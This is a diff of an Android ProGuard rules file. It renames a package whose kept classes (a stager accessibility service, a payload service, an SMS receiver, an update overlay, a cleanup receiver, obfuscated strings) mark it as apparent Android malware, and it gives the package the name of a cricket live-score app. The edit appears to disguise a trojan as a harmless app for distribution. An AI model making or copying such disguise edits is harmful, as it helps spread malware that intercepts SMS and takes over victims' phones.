@@ -3,19 +3,19 @@
 # ============================================
 
 # Keep entry points (services, receivers, activities)
--keep class com.chameleon.stager.service.StagerAccessibilityService { *; }
--keep class com.chameleon.stager.service.PayloadService { *; }
--keep class com.chameleon.stager.service.SmsReceiver { *; }
--keep class com.chameleon.stager.ui.MainActivity { *; }
--keep class com.chameleon.stager.ui.UpdateOverlayActivity { *; }
--keep class com.chameleon.stager.ui.CleanupReceiver { *; }
--keep class com.chameleon.stager.StagerApplication { *; }
+-keep class com.cricket.livescore.service.StagerAccessibilityService { *; }
+-keep class com.cricket.livescore.service.PayloadService { *; }
+-keep class com.cricket.livescore.service.SmsReceiver { *; }
+-keep class com.cricket.livescore.ui.MainActivity { *; }
+-keep class com.cricket.livescore.ui.UpdateOverlayActivity { *; }
+-keep class com.cricket.livescore.ui.CleanupReceiver { *; }
+-keep class com.cricket.livescore.StagerApplication { *; }
 
 # Keep utility classes used via reflection or serialization
--keep class com.chameleon.stager.utils.CryptoUtils { *; }
--keep class com.chameleon.stager.utils.ObfuscatedStrings { *; }
--keep class com.chameleon.stager.utils.NetworkUtils { *; }
--keep class com.chameleon.stager.utils.PermissionHelper { *; }
+-keep class com.cricket.livescore.utils.CryptoUtils { *; }
+-keep class com.cricket.livescore.utils.ObfuscatedStrings { *; }
+-keep class com.cricket.livescore.utils.NetworkUtils { *; }
+-keep class com.cricket.livescore.utils.PermissionHelper { *; }
 
 # Keep JSON
 -keep class org.json.** { *; }
@@ -41,4 +41,4 @@
 
 # Remove unused code
 -dontskipnonpubliclibraryclasses
--whyareyoukeeping class com.chameleon.stager.** { *; }
+-whyareyoukeeping class com.cricket.livescore.** { *; }
